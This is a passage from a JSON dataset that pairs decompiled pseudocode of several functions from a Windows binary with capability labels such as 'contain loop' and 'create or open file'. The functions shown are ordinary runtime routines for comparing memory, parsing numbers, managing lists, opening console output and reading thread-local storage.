(iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 2)) - *(arg_ch + (arg_10h - 2));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\ncode_r0x004250af:\n    uVar4 = *(arg_8h + (arg_10h - 1));\n    uVar2 = *(arg_ch + (arg_10h - 1));\n    if (uVar4 == uVar2) {\n        return 0;\n    }\n    return (0 < uVar4 - uVar2) * 2 + -1;\n}\n",
        "token_count": 16365
    },
    "004226d3": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.004226d3(void)\n\n{\n    *0x443f24 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "0040a6b7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a6b7(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00409270(0x441878, 0xc);\n    fcn.0040a7e9(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x445020;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x44501c;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040a6fc;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040970c(arg_8h_00);\ncode_r0x0040a6fc:\n        fcn.0040970c(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040a71f();\n    fcn.004092b5();\n    return;\n}\n",
        "token_count": 401
    },
    "004229c7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004229c7(uint8_t *param_1, uint8_t **param_2, uint param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint8_t *arg_ch;\n    int32_t aiStack48 [2];\n    int32_t iStack40;\n    char cStack36;\n    uchar auStack32 [24];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443998 ^ &stack0xfffffffc;\n    fcn.00408312(param_3);\n    if (param_2 != NULL) {\n        *param_2 = param_1;\n    }\n    iVar4 = aiStack48[0];\n    arg_ch = param_1;\n    if (param_1 == NULL) {\n        puVar1 = fcn.00409004();\n        *puVar1 = 0x16;\n        fcn.00407cd0();\n    }\n    else {\n        while( true ) {\n            if (*(iVar4 + 0x74) < 2) {\n                uVar2 = *(*(iVar4 + 0x90) + *arg_ch * 2) & 8;\n            }\n            else {\n                uVar2 = fcn.0041d5bb(*arg_ch, 8, aiStack48);\n                iVar4 = aiStack48[0];\n            }\n            if (uVar2 == 0) break;\n            arg_ch = arg_ch + 1;\n        }\n        puVar3 = fcn.0042775d(auStack32, arg_ch, aiStack48);\n        if (param_2 != NULL) {\n            *param_2 = arg_ch + puVar3[1];\n        }\n        if ((*puVar3 & 0x240) == 0) {\n            if ((*puVar3 & 0x81) == 0) {\n                if (((*puVar3 & 0x100) != 0) && (*(puVar3 + 4) == 0.0)) {\n                    puVar1 = fcn.00409004();\n                    *puVar1 = 0x22;\n                }\n            }\n            else {\n                puVar1 = fcn.00409004();\n                *puVar1 = 0x22;\n            }\n        }\n        else if (param_2 != NULL) {\n            *param_2 = param_1;\n        }\n    }\n    if (cStack36 != '\\0') {\n        *(iStack40 + 0x70) = *(iStack40 + 0x70) & 0xfffffffd;\n    }\n    fcn.00406eb1(unaff_EBX);\n    return;\n}\n",
        "token_count": 605
    },
    "00427de9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00427de9(uint16_t *param_1, uint16_t **param_2, uint param_3)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint unaff_EBX;\n    uint16_t *arg_ch;\n    uchar auStack56 [8];\n    int32_t iStack48;\n    char cStack44;\n    double dStack40;\n    uchar auStack32 [24];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443998 ^ &stack0xfffffffc;\n    fcn.00408312(param_3);\n    if (param_2 != NULL) {\n        *param_2 = param_1;\n    }\n    if (param_1 == NULL) {\n        puVar2 = fcn.00409004();\n        *puVar2 = 0x16;\n        fcn.00407cd0();\n    }\n    else {\n        uVar1 = *param_1;\n        arg_ch = param_1;\n        while (iVar3 = fcn.0041cded(uVar1, 8),  iVar3 != 0) {\n            arg_ch = arg_ch + 1;\n            uVar1 = *arg_ch;\n        }\n        puVar4 = fcn.00428219(auStack32, arg_ch, auStack56);\n        if (param_2 != NULL) {\n            *param_2 = arg_ch + puVar4[1];\n        }\n        if ((*puVar4 & 0x240) == 0) {\n            if ((*puVar4 & 0x81) == 0) {\n                if (((*puVar4 & 0x100) != 0) && (*(puVar4 + 4) == 0.0)) {\n                    puVar2 = fcn.00409004();\n                    *puVar2 = 0x22;\n                }\n            }\n            else {\n                dStack40 = *0x4441f0;\n                if (*arg_ch == 0x2d) {\n                    dStack40 = -*0x4441f0;\n                }\n                puVar2 = fcn.00409004();\n                *puVar2 = 0x22;\n            }\n        }\n        else if (param_2 != NULL) {\n            *param_2 = param_1;\n        }\n    }\n    if (cStack44 != '\\0') {\n        *(iStack48 + 0x70) = *(iStack48 + 0x70) & 0xfffffffd;\n    }\n    fcn.00406eb1(unaff_EBX);\n    return;\n}\n",
        "token_count": 584
    },
    "0040ab00": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ab00(uint arg_8h)\n\n{\n    if ((*0x456c08 ^ *0x443998) != NULL) {\n        (*(*0x456c08 ^ *0x443998))();\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)(arg_8h);\n    return;\n}\n",
        "token_count": 80
    }
}